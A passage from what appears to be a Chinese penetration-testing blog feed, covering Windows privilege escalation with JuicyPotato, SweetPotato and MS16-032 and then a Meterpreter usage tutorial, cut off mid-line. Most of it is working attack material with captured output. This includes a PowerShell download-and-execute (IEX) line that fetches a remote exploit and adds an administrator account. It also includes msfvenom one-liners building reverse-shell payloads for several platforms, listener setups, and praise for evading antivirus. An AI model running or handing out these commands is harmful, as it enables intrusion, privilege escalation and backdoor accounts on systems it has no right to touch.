class="headerlink" title="选择可用的CLSID"></a>选择可用的CLSID</h5><p>参考列表</p><p><code>https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</code></p><p>根据你的系统类型选择<code>CLSID（EG:&#123;9B1F122C-2982-4e91-AA8B-E071D54F2A4D&#125;）</code></p><p>然后-c指定即可。</p><h5 id="选择一个系统未占用的端口作为监听端口"><a href="#选择一个系统未占用的端口作为监听端口" class="headerlink" title="选择一个系统未占用的端口作为监听端口"></a>选择一个系统未占用的端口作为监听端口</h5><p>-l参数指定即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JuicyPotato.exe -t t -p c:\windows\system32\cmd.exe -l 1111 -c &#123;9B1F122C-2982-4e91-AA8B-E071D54F2A4D&#125;）</span><br></pre></td></tr></table></figure><p>即使用SeImpersonate权限创建进程，监听端口1111，使用的CLSID为{8BC3F05E-D86B-11D0-A075-00C04FB68820}来进行提权。</p><h4 id="msf利用烂土豆提权"><a href="#msf利用烂土豆提权" class="headerlink" title="msf利用烂土豆提权"></a>msf利用烂土豆提权</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;ms16_075_reflection_juicy</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set session 1</span><br><span class="line">set lhost xx.xx.xx.xx</span><br><span class="line">set lport 6666</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>如果目标系用没有权限则：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] Started reverse TCP handler on 164.155.95.55:4444 </span><br><span class="line">[-] Microsoft Windows before Server 2008 R2 are not vulnerable.</span><br><span class="line">[-] Exploit aborted due to failure: no-access: User does not have SeImpersonate or SeAssignPrimaryToken Privilege</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure><p>对应的目标系统权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">D:\S_JCIN\WebSite\OutWeb\L_CT\News&gt; whoami &#x2F;priv</span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line">特殊权限名称                  描述                   状况  </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">SeAuditPrivilege              产生安全稽核           已停用</span><br><span class="line">SeIncreaseQuotaPrivilege      调整处理程序记忆体配额 已停用</span><br><span class="line">SeAssignPrimaryTokenPrivilege 更换处理层权杖         已停用</span><br><span class="line">SeChangeNotifyPrivilege       略过周游检查           已启用</span><br><span class="line">SeImpersonatePrivilege        验证后模拟用户端       已启用</span><br><span class="line">SeCreateGlobalPrivilege       建立全域物件           已启用</span><br></pre></td></tr></table></figure><p>可以看到<code>SeAssignPrimaryToken</code>已停用。</p><h4 id="SweetPotato-exe"><a href="#SweetPotato-exe" class="headerlink" title="SweetPotato.exe"></a>SweetPotato.exe</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SweetPotato.exe -a &quot;whoami&quot;</span><br><span class="line">Modify by https:&#x2F;&#x2F;www.xljtj.com</span><br><span class="line">[+] Attempting DCOM NTLM interception with CLID 4991D34B-80A1-4291-83B6-3328366B9097 on port 6666 using method Token to launch c:\Windows\System32\cmd.exe</span><br><span class="line">[+] Intercepted and authenticated successfully, launching program</span><br><span class="line">[+] CreatePipe success</span><br><span class="line">[+] Created launch thread using impersonated user NT AUTHORITY\SYSTEM</span><br><span class="line">[+] Command : &quot;c:\Windows\System32\cmd.exe&quot; &#x2F;c whoami </span><br><span class="line">[+] process with pid: 0 created.</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[!] Failed to created impersonated process with token: 1349</span><br></pre></td></tr></table></figure><h3 id="ms16-032"><a href="#ms16-032" class="headerlink" title="ms16-032"></a>ms16-032</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><h4 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h4><ul><li><p>漏洞影响从Vista到Windows 10的所有Windows版本（包括服务器版本），比如03、08和12。</p></li><li><p>目标系统需要有2个以上的CPU核心</p></li><li><p>PowerShell v2.0及更高版本必须正在运行</p></li></ul><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(‘https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Ridter&#x2F;Pentest&#x2F;master&#x2F;powershell&#x2F;MyShell&#x2F;Invoke-MS16-032.ps1&#39;);Invoke-MS16-032 -Application cmd.exe -commandline &#39;&#x2F;c net localgroup administrators test1 &#x2F;add&#39;&quot;</span><br><span class="line">     __ __ ___ ___   ___     ___ ___ ___</span><br><span class="line">    |  V  |  _|_  | |  _|___|   |_  |_  |</span><br><span class="line">    |     |_  |_| |_| . |___| | |_  |  _|</span><br><span class="line">    |_|_|_|___|_____|___|   |___|___|___|</span><br><span class="line"></span><br><span class="line">                   [by b33f -&gt; @FuzzySec]</span><br><span class="line"></span><br><span class="line">[?] Operating system core count: 8</span><br><span class="line">[&gt;] Duplicating CreateProcessWithLogonW handles..</span><br><span class="line">[?] Done, got 2 thread handle(s)!</span><br><span class="line"></span><br><span class="line">[?] Thread handle list:</span><br><span class="line">1604</span><br><span class="line">2424</span><br><span class="line"></span><br><span class="line">[*] Sniffing out privileged impersonation token..</span><br><span class="line"></span><br><span class="line">[?] Trying thread handle: 1604</span><br><span class="line">[?] Thread belongs to: svchost</span><br><span class="line">[+] Thread suspended</span><br><span class="line">[&gt;] Wiping current impersonation token</span><br><span class="line">[&gt;] Building SYSTEM impersonation token</span><br><span class="line">[?] Success, open SYSTEM token handle: 2420</span><br><span class="line">[+] Resuming thread..</span><br><span class="line"></span><br><span class="line">[*] Sniffing out SYSTEM shell..</span><br><span class="line"></span><br><span class="line">[&gt;] Duplicating SYSTEM token</span><br><span class="line">[&gt;] Starting token race</span><br><span class="line">[&gt;] Starting process race</span><br><span class="line">[!] Holy handle leak Batman, we have a SYSTEM shell!!</span><br><span class="line"></span><br><span class="line">PS C:\Documents and Settings\good&gt; net localgroup administrators</span><br><span class="line">別名     administrators</span><br><span class="line">註解     Administrators 可以完全不受限制地存取電腦&#x2F;網域</span><br><span class="line"></span><br><span class="line">成員</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator</span><br><span class="line">banli$</span><br><span class="line">good</span><br><span class="line">Guest</span><br><span class="line">gust</span><br><span class="line">IUSR_TELNET</span><br><span class="line">TelNet</span><br><span class="line">命令執行成功。</span><br></pre></td></tr></table></figure><h5 id="ps脚本"><a href="#ps脚本" class="headerlink" title="ps脚本"></a>ps脚本</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1</span></span><br></pre></td></tr></table></figure><p>执行系统命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -exec bypass -c <span class="string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1&#x27;);Invoke-MS16-032 -Application cmd.exe -commandline &#x27;/c net user evi1cg test123 /add&#x27;&quot;</span></span><br></pre></td></tr></table></figure><h5 id="exe文件"><a href="#exe文件" class="headerlink" title="exe文件"></a>exe文件</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032</span></span><br></pre></td></tr></table></figure><h5 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h5><p>MS16-032 Secondary Logon Handle提权，该模块利用的是Windows Secondary Logon服务中标准句柄清理功能的缺失。已知该漏洞会影响Windows7-10，Windows Server2008和2012，32位和64位都会受影响。这个模块只对集成了powershell2.0或更高版本的Windows且具有多个CPU内核的系统有效。<br>步骤同上，直接在MSF中使用下列命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;ms16_032_secondary_logon_handle_privesc</span><br><span class="line">set session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网学习--Metasploit使用</title>
      <link href="2020/11/12/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Metasploit%E4%BD%BF%E7%94%A8/"/>
      <url>2020/11/12/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Metasploit%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Metasploit–Meterpreter使用"><a href="#Metasploit–Meterpreter使用" class="headerlink" title="Metasploit–Meterpreter使用"></a>Metasploit–Meterpreter使用</h1><h2 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h2><h3 id="什么是Meterpreter"><a href="#什么是Meterpreter" class="headerlink" title="什么是Meterpreter"></a>什么是Meterpreter</h3><p>Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpretershell的链接。</p><h3 id="Meterpreter优点"><a href="#Meterpreter优点" class="headerlink" title="Meterpreter优点"></a>Meterpreter优点</h3><ul><li>Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件。</li><li>它在运行的时候系统时间是变化的</li><li>Meterpreter的工作模式是纯内存的，好处是启动隐藏，很难被杀毒软件监测到。不需要访问目标主机磁盘，所以也没什么入侵的痕迹。</li></ul><h3 id="Meterpreter基础常用命令"><a href="#Meterpreter基础常用命令" class="headerlink" title="Meterpreter基础常用命令"></a>Meterpreter基础常用命令</h3><h4 id="进入CMD-shell"><a href="#进入CMD-shell" class="headerlink" title="进入CMD-shell"></a>进入CMD-shell</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 4180 created.</span><br><span class="line">Channel 3 created.</span><br><span class="line">Microsoft Windows</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator.WEB\Desktop&gt;</span><br></pre></td></tr></table></figure><h4 id="解决中文乱码问题"><a href="#解决中文乱码问题" class="headerlink" title="解决中文乱码问题"></a>解决中文乱码问题</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chcp 65001</span><br></pre></td></tr></table></figure><p>或者将终端临时设置为GBK系列编码即可</p><h4 id="退出会话"><a href="#退出会话" class="headerlink" title="退出会话"></a>退出会话</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quit  # 退出会话  </span><br></pre></td></tr></table></figure><h4 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat # 查看文件内容  </span><br><span class="line">getwd # 查看当前工作目录  </span><br><span class="line">upload  # 上传文件到目标机上  </span><br><span class="line">download # 下载文件到本机上  </span><br><span class="line">edit # 编辑文件  </span><br><span class="line">search  # 搜索文件</span><br></pre></td></tr></table></figure><h3 id="Meterpreter中常用的Shell"><a href="#Meterpreter中常用的Shell" class="headerlink" title="Meterpreter中常用的Shell"></a>Meterpreter中常用的Shell</h3><h4 id="msf搜索正向shell与反向shell的payload"><a href="#msf搜索正向shell与反向shell的payload" class="headerlink" title="msf搜索正向shell与反向shell的payload"></a>msf搜索正向shell与反向shell的payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search reverse_tcp或者bind_tcp</span><br></pre></td></tr></table></figure><p>reverse_tcp</p><h4 id="常见shell生成"><a href="#常见shell生成" class="headerlink" title="常见shell生成"></a>常见shell生成</h4><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Linux：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line"></span><br><span class="line">Windows:</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br><span class="line"></span><br><span class="line">PHP:</span><br><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line"></span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo <span class="string">&#x27;&lt;?php &#x27;</span> | tr -d <span class="string">&#x27;\n&#x27;</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br><span class="line"></span><br><span class="line">ASP:</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br><span class="line"></span><br><span class="line">JSP:</span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br><span class="line"></span><br><span class="line">Python:</span><br><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br><span class="line"></span><br><span class="line">Bash:</span><br><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br><span class="line"></span><br><span class="line">Perl:</span><br><span class="line">msfvenom -p cmd/unix/reverse</span><br><span class="line">_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure><h4 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h4><h5 id="使用情况"><a href="#使用情况" class="headerlink" title="使用情况"></a>使用情况</h5><h5 id="reverse-tcp"><a href="#reverse-tcp" class="headerlink" title="reverse_tcp"></a>reverse_tcp</h5><p>基于TCP的反弹shell，反向shell是攻击机器不能联通目标机器，目标机器主动连接攻击机器。</p><h6 id="PHP-Shell"><a href="#PHP-Shell" class="headerlink" title="PHP-Shell"></a>PHP-Shell</h6><ul><li><p>生成一句话木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;攻击IP LPORT&#x3D;监听端口 R &gt; shell.php</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  Desktop msfvenom -p php/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.1</span><span class="number">.109</span> LPORT=<span class="number">1234</span> R &gt; shell.php</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::PHP <span class="keyword">from</span> the payload</span><br><span class="line">[-] No arch selected, selecting arch: php <span class="keyword">from</span> the payload</span><br><span class="line">No encoder <span class="keyword">or</span> badchars specified, outputting raw payload</span><br><span class="line">Payload size: <span class="number">1114</span> bytes</span><br></pre></td></tr></table></figure></li><li><p>msfconsole 监听端口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 攻击IP</span><br><span class="line">lhost =&gt; 192.168.0.108</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport 监听端口</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line">[-] Handler failed to bind to <span class="number">192.168</span><span class="number">.0</span><span class="number">.108</span>:<span class="number">1234</span>:-  -</span><br><span class="line">[*] Started reverse TCP handler on <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">1234</span></span><br></pre></td></tr></table></figure></li></ul><h6 id="EXE-木马"><a href="#EXE-木马" class="headerlink" title="EXE-木马"></a>EXE-木马</h6><ul><li><p>生成木马</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=攻击IP  LPORT=监听端口 -f exe &gt; hacker.exe</span><br></pre></td></tr></table></figure></li><li><p>msfconsole监听端口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp </span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set LHOST 攻击IP</span><br><span class="line">msf5 exploit(multi/handler) &gt; set LPORT 监听端口</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure></li></ul><h5 id="reverse-http"><a href="#reverse-http" class="headerlink" title="reverse_http"></a>reverse_http</h5><p>基于http方式的反向连接，在网速慢的情况下不稳定。</p><h5 id="reverse-https"><a href="#reverse-https" class="headerlink" title="reverse_https"></a>reverse_https</h5><p>基于https方式的反向连接，在网速慢的情况下不稳定。</p><h4 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向shell</h4><h5 id="使用情况-1"><a href="#使用情况-1" class="headerlink" title="使用情况"></a>使用情况</h5><ul><li>目标机器不允许某些端口出站。</li><li>目标机器不能联通外网，但是我们可以联通目标机器。</li></ul><p>目标机器执行木马之后会打开对应的端口，进行shell连接，正向shell就是目标不能连接攻击端，攻击机器主动连接目标机器。</p><h5 id="bind-tcp"><a href="#bind-tcp" class="headerlink" title="bind_tcp"></a>bind_tcp</h5><p>基于TCP的正向连接shell，因为在内网跨网段时无法连接到attack的机器，所以在内网中经常会使用，不需要设置LHOST。</p><p>设置的IP地址和端口就是目标机的。</p><h6 id="PHP-Shell-1"><a href="#PHP-Shell-1" class="headerlink" title="PHP-Shell"></a>PHP-Shell</h6><ul><li><p>生成一句话木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;bind_tcp LHOST&#x3D;攻击IP LPORT&#x3D;监听端口 R &gt; shell.php</span><br></pre></td></tr></table></figure></li><li><p>msfconsole监听端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload php&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">payload &#x3D;&gt; php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lhost 攻击IP</span><br><span class="line">lhost &#x3D;&gt; 192.168.0.108</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lport 监听端口</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; run</span><br></pre></td></tr></table></figure></li></ul><h6 id="EXE-木马-1"><a href="#EXE-木马-1" class="headerlink" title="EXE-木马"></a>EXE-木马</h6><ul><li><p>生成木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;&lt;Attack Port&gt; -f exe &gt;&#x2F;root&#x2F;bind_xx.exe</span><br></pre></td></tr></table></figure></li><li><p>msfconsole监听端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br></pre></td></tr></table></figure></li></ul><h3 id="升级正常的Shell到Meterpreter"><a href="#升级正常的Shell到Meterpreter" class="headerlink" title="升级正常的Shell到Meterpreter"></a>升级正常的Shell到Meterpreter</h3><p>通常情况下， 当我们通过直接渗透进入系统， 并且得到了远程系统的Shell，下一步我们想要获得是Meterpreter Shell,  因为Meterpreter Shell可以向我们提供更多功能。 比如说， 提升权限， 整合到现有运行程序等等。这方面Sessions  Command 可以帮助我们实现从Shell 到Meterpreter提升。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5&gt;run post/multi/manage/shell_to_meterpreter</span><br><span class="line">msf5 post(multi/manage/shell_to_meterpreter) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (post/multi/manage/shell_to_meterpreter):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection</span><br><span class="line">   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).</span><br><span class="line">   LPORT    4433             yes       Port for payload to connect to.</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line">msf5&gt;set session 2</span><br><span class="line">msf5&gt;run</span><br></pre></td></tr></table></figure><p>使用一下命名进行切换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -u sessionid</span><br></pre></td></tr></table></figure><h3 id="会话操作"><a href="#会话操作" class="headerlink" title="会话操作"></a>会话操作</h3><h4 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sessions <span class="comment">#查看会话</span></span><br><span class="line">sessions -i &lt;ID值&gt;  <span class="comment">#进入会话</span></span><br></pre></td></tr></table></figure><h4 id="将回话保存到后台，进入会话"><a href="#将回话保存到后台，进入会话" class="headerlink" title="将回话保存到后台，进入会话"></a>将回话保存到后台，进入会话</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session <span class="number">1.</span>..</span><br><span class="line">切换到会话<span class="number">1</span></span><br><span class="line">msf5 exploit(multi/handler) &gt; sessions -i <span class="number">1</span></span><br><span class="line">[*] Starting interaction <span class="keyword">with</span> <span class="number">1.</span>..</span><br></pre></td></tr></table></figure><h4 id="查看会话"><a href="#查看会话" class="headerlink" title="查看会话"></a>查看会话</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; sessions -l</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                 Connection</span><br><span class="line">  --  ----  ----                     -----------                 ----------</span><br><span class="line">  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ STU1  172.20.10.3:1234 -&gt; 172.20.10.6:6990 (172.20.10.6)</span><br></pre></td></tr></table></figure><h4 id="删除回话"><a href="#删除回话" class="headerlink" title="删除回话"></a>删除回话</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/script/web_delivery) &gt; sessions -k 2</span><br><span class="line">[*] <span class="function">Killing the following <span class="title">session</span><span class="params">(s)</span>: 2</span></span><br><span class="line">[*] Killing session 